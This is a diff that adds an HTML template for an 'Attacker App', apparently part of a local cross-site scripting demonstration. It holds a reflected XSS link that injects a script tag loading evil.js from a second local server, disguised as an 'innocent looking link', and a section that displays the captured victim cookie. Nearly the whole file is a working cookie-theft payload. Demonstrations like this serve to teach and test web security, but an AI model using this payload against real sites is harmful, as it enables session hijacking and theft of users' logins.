@@ -1,0 +1,15 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Attacker App</title>
+</head>
+<body>
+    <h1>Welcome to Attacker App</h1>
+    <a href="http://127.0.0.1:5000/search?query=<script src='http://127.0.0.1:5001/static/evil.js'></script>">
+        Click this innocent looking link!
+    </a>
+    <h2>Captured Cookie:</h2>
+    <p>{{ cookie }}</p>
+</body>
+</html>
